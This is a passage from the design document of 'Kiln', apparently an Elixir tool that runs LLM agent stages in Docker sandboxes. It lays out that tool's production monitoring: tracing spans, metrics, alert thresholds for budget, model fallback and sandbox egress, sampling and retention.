| **Fallback-rate monitor** | **Daily aggregation** of `model_routing_fallback` audit events over the last 24h (Ecto query grouped by `{requested_model, actual_model_used, tier_crossed}`). Computed by a scheduled Oban worker `Kiln.Policies.FallbackRateMonitor` (scaffolded in P3 per D-139 precedent — empty body, cron-disabled; Phase 8 cost-intel panel populates the body). | **>5% of total calls fell back** → emits `provider_degradation_suspected` audit event + flags in `/ops/dashboard` (Phase 7+). **>1% of calls crossed tier** → emits `cross_tier_fallback_rate_high` audit event + desktop notification to operator. **Run-level escalation:** if a single run has ≥3 cross-tier fallbacks in 5 minutes, the run is paused with typed block `:rate_limit_exhausted` for operator review. |
| **Egress-attempt baseline** | **Daily aggregation** of `kiln.sandbox.egress_attempt` telemetry counter. **Production baseline: 0.** Any non-zero emits an audit event + alert regardless of "rate." | **Any >0 count/day** → P0 incident. Opens GitHub issue labeled `security-egress-breach`; fires desktop notification; records which stage/container/destination triggered it (the 5-tuple logged by the online detector). Run halted, operator paged. This is the one offline flywheel that is *also* treated as an online guardrail because a single occurrence is catastrophic. |
| **Orphan-container sweep telemetry** | **Every BEAM boot** (not sampled — happens at startup). `Kiln.Sandboxes.OrphanSweeper` emits `orphan_container_swept` audit events for each container whose `kiln.boot_epoch` label doesn't match the current boot. | **>0 orphans per boot** = normal (crashed previous run); **>10 orphans per boot** = degraded lifecycle (MuonTrap or cgroup binding regressed somewhere); opens issue labeled `lifecycle-regression`. Running total of "orphans swept at boot" across the month is a cost signal — zombie containers consumed host resources we didn't mean to spend. |

## 7. Production Monitoring

**Tracing Tool:** **OpenTelemetry 1.6 (Erlang SDK — traces stable) → local Grafana Tempo, self-hosted in Docker Compose.** This is the Kiln default and explicitly overrides the GSD-template default of Arize Phoenix. Rationale: Kiln is local-first, solo-operator, Elixir/OTP — the Grafana stack (Tempo for traces, Prometheus/`telemetry_metrics_prometheus_core` for metrics, Loki for `logger_json` structured logs) composes with the existing `compose.yaml` and has no Python runtime. Phoenix/RAGAS/Langfuse remain the right answer for LLM-output eval (Phase 7+) and are NOT installed in P3. `OpentelemetryProcessPropagator` (pinned in P1) handles Oban → LLM span linking per PITFALLS P17.

**Span Hierarchy (the contract every P3 caller emits):**

```
kiln.stage.execute              ← root span; emitted by StageWorker; attrs: run_id, stage_id, role, preset
├── kiln.budget.check           ← BudgetGuard.check!/2; attrs: estimated_usd, remaining_usd, model
├── kiln.agent.call             ← Adapter.*.complete/2 entry; attrs: requested_model, adapter_mod
│   └── kiln.agent.llm_request  ← Anthropix HTTP round-trip; attrs: actual_model_used, tokens_in, tokens_out, cost_usd, stop_reason, http_status, fallback_attempt
└── kiln.sandbox.exec           ← DockerDriver.run_stage/1; attrs: image_digest, boot_epoch, container_id (post-start), exit_status, duration_ms
    └── kiln.sandbox.hydrate    ← CAS → tmpfs materialization
    └── kiln.sandbox.harvest    ← tmpfs → CAS; attrs: artifact_count, bytes_written
```

**Key Metrics to Track (5 — emitted via `:telemetry` + `telemetry_metrics` + Prometheus reporter per P1 stack):**

1. **`kiln.agent.call.duration_ms`** — histogram; tagged by `{role, requested_model, actual_model_used}`. Aggregate as p50/p95/p99 per role. LiveDashboard per-role panel (D-103 scaffolded in P3, Phase 7 populates view).
2. **`kiln.agent.call.cost_usd`** — sum; tagged by `{run_id, role, actual_model_used}`. Two roll-ups: per-run (for BudgetGuard post-flight validation against pre-flight estimate) and per-day (for burn-rate).
3. **`kiln.agent.call.tokens_in` / `.tokens_out`** — sum; tagged by `{model}`. Used by the pricing-table drift signal (ratio of input/output over time against pricing-page claims).
4. **`kiln.agent.fallback.rate`** — counter; tagged by `{requested_model → actual_model_used, tier_crossed, fallback_reason}`. Two roll-ups: count/hour (short-term provider-degradation signal) and tier-crossing as a percent of total calls (long-term trend).
5. **`kiln.sandbox.egress_attempt`** — counter; tagged by `{stage_id, src_container, dst_ip, dst_port, protocol}`. **Production baseline: 0.** Any non-zero is alert-worthy.

**Supporting metrics (emitted but not P0):** `kiln.budget.check.duration_ms`, `kiln.sandbox.exec.duration_ms`, `kiln.sandbox.orphans_swept.count`, `kiln.dtu.contract_drift.count`, `kiln.secrets.reveal_count` (should match provider count; any delta is investigation-worthy), `kiln.stage.execute.duration_ms`.

**Alert Thresholds (configured in `Kiln.Notifications` + LiveDashboard + operator-facing panels):**

| Condition | Severity | Action |
|-----------|----------|--------|
| `stage.cost_usd > run.caps_snapshot.max_tokens_usd * 0.8` | Warning | LiveView banner on `/ops/runs/:id` — "Run is at 80% of budget. Review caps." |
| `stage.cost_usd > run.caps_snapshot.max_tokens_usd * 1.0` | Critical | Halt run with typed block `:budget_exceeded` (this IS the online BudgetGuard; threshold surfaces for post-hoc analysis too). |
| `kiln.sandbox.egress_attempt > 0` in any 1-minute window | P0 | osascript/notify-send desktop notification + Slack webhook (if `KILN_SLACK_WEBHOOK_URL` set) + GitHub issue via `gh issue create --label security-egress-breach`. Run halted. |
| `kiln.agent.fallback.rate.cross_tier > 3` in 5 minutes for a single run | Critical | Desktop notification; run paused with typed block `:rate_limit_exhausted` pending operator review. |
| `kiln.agent.fallback.rate.any > 5%` of total calls in last hour | Warning | LiveView dashboard badge "provider_degradation_suspected"; auto-opens GitHub issue if sustained >1h. |
| `kiln.agent.call.duration_ms` p99 > 60000 ms for 5 minutes | Warning | Desktop notification; surfaced in LiveDashboard with the last 20 span traces. Provider likely degraded; check Anthropic status page. |
| `kiln.sandbox.orphans_swept.count > 10` at boot | Warning | Log + audit event `lifecycle_regression_suspected`; informational — next run proceeds normally but the operator should investigate MuonTrap binding. |
| `kiln.dtu.contract_drift.count > 0` in weekly run | Warning | GitHub issue auto-opened with the diff summary; operator batches a snapshot-refresh PR. |

**Smart Sampling Strategy:**

- **v1 default: 100% sampling.** Every `:telemetry.span/3`, every audit event, every Finch request is traced. Rationale: solo-operator persona, low-volume workloads (single-digit runs per hour in dogfood), LiveDashboard is the primary consumer and it shows every call. The cost of sampling discipline (deciding what to keep) outweighs the cost of keeping everything at Kiln's v1 scale.
- **Rationale recorded for Phase 7+ reconsideration:** if volume grows beyond ~100 runs/hour or ~1000 LLM calls/hour, P7 planning should re-evaluate. Pre-wired signal-weighting filters for future smart sampling (none active in P3, documented here so the migration has a target):
  - **Keep-always (even if future sampling lowers the default):** any stage with `tier_crossed: true`; any `kiln.sandbox.egress_attempt > 0`; any typed-block escalation; any `model_routing_fallback` event; any `dtu_contract_drift_detected` event; any run with `duration_ms > p99`.
  - **Keep at elevated rate:** stages with `cost_usd > per_role_p95`; stages with `retry_attempt > 1`; stages with `status = :failed`.
  - **Down-sample candidates (if/when we need to reduce volume):** successful verifier-role stages on Haiku (high-volume, low-signal); successful DTU health-poll requests.

**Retention:**

- **Traces (Tempo):** 7 days local (solo-operator, local-first disk budget). Longer retention via Tempo's S3 backend is Phase 9 consideration.
- **Metrics (Prometheus):** 30 days local.
- **Audit events (Postgres `audit_events` table):** INDEFINITELY — append-only by construction (CLAUDE.md non-negotiable; D-12 three-layer immutability in P1). The audit ledger IS the long-term eval record.
